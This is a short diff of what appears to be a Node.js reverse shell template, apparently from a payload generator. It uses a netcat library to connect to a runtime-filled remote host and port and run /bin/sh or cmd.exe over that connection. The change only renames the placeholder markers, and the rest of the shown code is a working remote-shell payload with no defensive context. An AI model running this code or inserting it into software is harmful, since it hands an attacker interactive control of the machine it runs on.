@@ -3,10 +3,10 @@ var NetcatClient = require('netcat').client
 var nc = new NetcatClient()
 var cmd = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh'
 
-// %%bookmark%% are replaced at runtime.
-var RHOST = %%addr%%
-var RPORT = %%port%%
-var RETRY = %%retry%%
+// Marker replaced at runtime.
+var RHOST = {{rhost}}
+var RPORT = {{rport}}
+var RETRY = {{retry}}
 
 nc.addr(RHOST).port(RPORT).retry(RETRY).connect().exec(cmd)
 
